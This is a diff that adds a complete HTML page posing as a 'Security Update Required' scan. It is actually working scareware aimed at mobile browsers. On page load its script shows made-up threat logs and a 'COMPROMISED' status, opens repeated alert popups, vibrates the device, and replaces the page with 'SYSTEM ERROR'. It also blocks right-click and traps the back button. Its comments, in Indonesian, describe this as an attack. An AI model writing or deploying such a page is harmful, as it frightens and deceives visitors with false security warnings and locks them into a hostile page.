@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 2px solid #0f0;
+            padding: 20px;
+            background: #111;
+            animation: glitch 0.5s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        h1 { color: #f00; margin-bottom: 20px; text-align: center; }
+        .scan-line {
+            height: 2px;
+            background: #0f0;
+            width: 100%;
+            margin: 10px 0;
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(400px); }
+        }
+        #log {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #0f0;
+            height: 200px;
+            overflow-y: scroll;
+            background: #222;
+        }
+    </style>
+</head>
+<body onload="startAttack()">
+    <div class="container">
+        <h1>⚠️ CRITICAL SYSTEM SCAN ⚠️</h1>
+        <div class="scan-line"></div>
+        <p>Device: <span id="device">Detecting...</span></p>
+        <p>Status: <span id="status" style="color:#f00">COMPROMISED</span></p>
+        <div id="log"></div>
+        <div class="scan-line"></div>
+        <p style="text-align:center; margin-top:20px; font-size:12px; color:#888">
+            Security Patch v3.7.2 | Do not close this window
+        </p>
+    </div>
+
+    <script>
+    function startAttack() {
+        // Deteksi device
+        const ua = navigator.userAgent;
+        const device = ua.includes('Android') ? 'Android' : 
+                      ua.includes('iPhone') ? 'iPhone' : 
+                      ua.includes('iPad') ? 'iPad' : 'Unknown';
+        document.getElementById('device').textContent = device;
+        
+        const log = document.getElementById('log');
+        let count = 0;
+        
+        function logMsg(msg) {
+            const entry = document.createElement('div');
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        logMsg('Starting deep system scan...');
+        logMsg(`Detected: ${device} (${ua.substring(0, 50)}...)`);
+        
+        // Serangan utama
+        const attackInterval = setInterval(() => {
+            count++;
+            
+            // Log faking
+            const threats = ['Memory injection', 'Root access', 'Data leak', 'Location tracking'];
+            logMsg(`THREAT: ${threats[count % threats.length]} detected`);
+            
+            // Alert bombing (setiap 5 detik)
+            if(count % 10 === 0) {
+                setTimeout(() => {
+                    alert(`🚨 SECURITY ALERT!\n\n${count} critical vulnerabilities found!\n\nYour ${device} is at risk.`);
+                }, 100);
+            }
+            
+            // Vibration (jika support)
+            if(navigator.vibrate && count % 7 === 0) {
+                navigator.vibrate([200, 100, 200]);
+            }
+            
+            // Redirect ke halaman error (setiap 15 detik)
+            if(count % 30 === 0) {
+                setTimeout(() => {
+                    document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:100px;">SYSTEM ERROR</h1>';
+                    document.body.style.backgroundColor = 'black';
+                }, 500);
+            }
+            
+            // Infinite loop protection - akan berjalan selamanya
+            if(count > 1000) count = 0;
+            
+        }, 500); // Setiap 500ms = 2x per detik
+        
+        // Auto scroll log
+        setInterval(() => {
+            log.scrollTop = log.scrollHeight;
+        }, 1000);
+        
+        // Blokir right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Blokir back button
+        window.history.pushState(null, null, window.location.href);
+        window.addEventListener('popstate', () => {
+            window.history.pushState(null, null, window.location.href);
+        });
+        
+        logMsg('Attack sequence initiated successfully');
+        logMsg('Device response: SLOWED');
+    }
+    </script>
+</body>
+</html>
